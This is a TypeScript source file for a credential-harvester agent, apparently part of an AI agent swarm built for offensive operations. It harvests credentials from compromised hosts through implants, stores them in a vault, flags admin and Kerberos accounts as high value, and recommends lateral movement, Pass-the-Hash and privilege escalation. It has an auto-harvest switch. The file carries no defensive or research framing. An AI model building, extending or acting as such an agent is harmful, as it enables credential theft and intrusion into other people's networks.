/**
 * Credential Harvester Agent
 * Specializes in harvesting credentials from compromised hosts
 * Integrates with credential vault for secure storage and reuse
 */

import { BaseAgent } from '../../swarm/agents/base-agent';
import { AgentConfig, AgentCapability, AgentMessage } from '../../swarm/types';
import { MessageBus } from '../../swarm/communication/message-bus';
import logger from '../../logger';
import { credentialVault } from '../credential-vault';
import type { CredentialHarvestRequest, CredentialHarvestResult, Credential } from '../types';

interface CredentialHarvestTask {
  type: 'harvest_credentials' | 'search_credentials' | 'analyze_credentials';
  hostId?: string;
  methods?: string[];
  query?: {
    type?: string;
    username?: string;
    domain?: string;
  };
  options?: any;
}

interface CredentialHarvestResultExtended {
  type: string;
  success: boolean;
  credentials?: Credential[];
  harvestResult?: CredentialHarvestResult;
  searchResults?: Credential[];
  analysis?: any;
  error?: string;
  timestamp: Date;
}

export class CredentialHarvesterAgent extends BaseAgent {
  private harvestHistory: Map<string, CredentialHarvestResult[]>;
  private autoHarvestEnabled: boolean;

  constructor(config: AgentConfig, messageBus: MessageBus) {
    super(config, messageBus);
    this.harvestHistory = new Map();
    this.autoHarvestEnabled = false;
  }

  protected getAgentTools(): any[] {
    return [
      {
        name: 'harvest_credentials',
        description: 'Harvest credentials from a compromised host using various methods',
        parameters: {
          hostId: { type: 'string', required: true },
          methods: { type: 'array', required: true }
        }
      },
      {
        name: 'search_credentials',
        description: 'Search stored credentials by type, username, or domain',
        parameters: {
          type: { type: 'string', required: false },
          username: { type: 'string', required: false },
          domain: { type: 'string', required: false }
        }
      },
      {
        name: 'analyze_credentials',
        description: 'Analyze harvested credentials for patterns and reuse opportunities',
        parameters: {
          hostId: { type: 'string', required: false }
        }
      }
    ];
  }

  protected async executeTask(task: CredentialHarvestTask): Promise<CredentialHarvestResultExtended> {
    logger.info(`CredentialHarvesterAgent executing ${task.type}`);

    switch (task.type) {
      case 'harvest_credentials':
        return await this.harvestCredentials(task.hostId!, task.methods!, task.options);
      case 'search_credentials':
        return await this.searchCredentials(task.query, task.options);
      case 'analyze_credentials':
        return await this.analyzeCredentials(task.hostId, task.options);
      default:
        throw new Error(`Unknown credential harvest task type: ${task.type}`);
    }
  }

  private async harvestCredentials(
    hostId: string,
    methods: string[],
    options?: any
  ): Promise<CredentialHarvestResultExtended> {
    try {
      logger.info(`Harvesting credentials from ${hostId} using methods: ${methods.join(', ')}`);

      const request: CredentialHarvestRequest = {
        hostId,
        methods,
        implantId: options?.implantId
      };

      const result = await credentialVault.harvestCredentials(request);

      // Track harvest history
      const history = this.harvestHistory.get(hostId) || [];
      history.push(result);
      this.harvestHistory.set(hostId, history);

      return {
        type: 'harvest_credentials',
        success: result.success,
        harvestResult: result,
        credentials: result.credentials,
        timestamp: new Date()
      };
    } catch (error) {
      logger.error('Failed to harvest credentials:', error);
      return {
        type: 'harvest_credentials',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        timestamp: new Date()
      };
    }
  }

  private async searchCredentials(
    query?: { type?: string; username?: string; domain?: string },
    options?: any
  ): Promise<CredentialHarvestResultExtended> {
    try {
      logger.info(`Searching credentials with query:`, query);

      const searchQuery: any = {};
      if (query?.type) searchQuery.type = query.type;
      if (query?.username) searchQuery.username = query.username;
      if (query?.domain) searchQuery.domain = query.domain;

      const results = await credentialVault.searchCredentials(searchQuery);

      return {
        type: 'search_credentials',
        success: true,
        searchResults: results,
        timestamp: new Date()
      };
    } catch (error) {
      logger.error('Failed to search credentials:', error);
      return {
        type: 'search_credentials',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        timestamp: new Date()
      };
    }
  }

  private async analyzeCredentials(
    hostId?: string,
    options?: any
  ): Promise<CredentialHarvestResultExtended> {
    try {
      logger.info(`Analyzing credentials${hostId ? ` for host ${hostId}` : ''}`);

      let credentials: Credential[];
      if (hostId) {
        credentials = await credentialVault.getCredentialsByHost(hostId);
      } else {
        credentials = await credentialVault.searchCredentials({});
      }

      const analysis = {
        totalCredentials: credentials.length,
        byType: this.groupByType(credentials),
        byDomain: this.groupByDomain(credentials),
        reusePatterns: this.identifyReusePatterns(credentials),
        highValueCredentials: this.identifyHighValueCredentials(credentials),
        recommendations: this.generateRecommendations(credentials)
      };

      return {
        type: 'analyze_credentials',
        success: true,
        analysis,
        timestamp: new Date()
      };
    } catch (error) {
      logger.error('Failed to analyze credentials:', error);
      return {
        type: 'analyze_credentials',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        timestamp: new Date()
      };
    }
  }

  private groupByType(credentials: Credential[]): Record<string, number> {
    const groups: Record<string, number> = {};
    for (const cred of credentials) {
      groups[cred.type] = (groups[cred.type] || 0) + 1;
    }
    return groups;
  }

  private groupByDomain(credentials: Credential[]): Record<string, number> {
    const groups: Record<string, number> = {};
    for (const cred of credentials) {
      if (cred.domain) {
        groups[cred.domain] = (groups[cred.domain] || 0) + 1;
      }
    }
    return groups;
  }

  private identifyReusePatterns(credentials: Credential[]): any[] {
    const patterns: any[] = [];

    // Identify password reuse
    const passwordMap = new Map<string, string[]>();
    for (const cred of credentials) {
      if (cred.password) {
        const users = passwordMap.get(cred.password) || [];
        users.push(cred.username);
        passwordMap.set(cred.password, users);
      }
    }

    for (const [password, users] of passwordMap.entries()) {
      if (users.length > 1) {
        patterns.push({
          type: 'password_reuse',
          affectedUsers: users,
          severity: users.length > 3 ? 'high' : 'medium'
        });
      }
    }

    return patterns;
  }

  private identifyHighValueCredentials(credentials: Credential[]): Credential[] {
    return credentials.filter(cred => {
      // High-value criteria
      return (
        cred.username.toLowerCase().includes('admin') ||
        cred.username.toLowerCase().includes('administrator') ||
        cred.type === 'Kerberos' ||
        (cred.domain && cred.domain.toLowerCase().includes('admin'))
      );
    });
  }

  private generateRecommendations(credentials: Credential[]): string[] {
    const recommendations: string[] = [];

    if (credentials.length === 0) {
      recommendations.push('No credentials found - consider harvesting from additional hosts');
      return recommendations;
    }

    const byType = this.groupByType(credentials);
    if (byType['Plaintext'] && byType['Plaintext'] > 0) {
      recommendations.push(`${byType['Plaintext']} plaintext credentials found - high priority for lateral movement`);
    }

    if (byType['NTLM'] && byType['NTLM'] > 0) {
      recommendations.push(`${byType['NTLM']} NTLM hashes available - can be used for Pass-the-Hash`);
    }

    const highValue = this.identifyHighValueCredentials(credentials);
    if (highValue.length > 0) {
      recommendations.push(`${highValue.length} high-value credentials identified - prioritize for privilege escalation`);
    }

    const reusePatterns = this.identifyReusePatterns(credentials);
    if (reusePatterns.length > 0) {
      recommendations.push(`${reusePatterns.length} credential reuse patterns detected - may indicate weak password policies`);
    }

    return recommendations;
  }

  enableAutoHarvest(): void {
    this.autoHarvestEnabled = true;
    logger.info('CredentialHarvesterAgent auto-harvest enabled');
  }

  disableAutoHarvest(): void {
    this.autoHarvestEnabled = false;
    logger.info('CredentialHarvesterAgent auto-harvest disabled');
  }

  getHarvestHistory(hostId: string): CredentialHarvestResult[] {
    return this.harvestHistory.get(hostId) || [];
  }

  clearHarvestHistory(hostId: string): void {
    this.harvestHistory.delete(hostId);
  }
}